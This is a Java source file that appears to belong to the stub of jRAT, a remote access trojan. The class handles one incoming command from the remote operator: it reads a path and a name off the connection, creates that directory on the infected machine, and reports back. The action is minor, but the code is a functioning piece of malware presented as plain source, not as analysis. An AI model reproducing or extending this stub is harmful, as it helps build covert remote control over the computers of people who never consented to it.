package io.jrat.stub.packets.incoming;

import io.jrat.stub.Connection;
import io.jrat.stub.Constants;

import java.io.File;


public class Packet43CreateDirectory extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		String where = Connection.readLine();
		String name = Connection.readLine();

		File file = new File(where + File.separator + name);
		file.mkdirs();
		Connection.status(Constants.STATUS_MKDIR);
	}

}
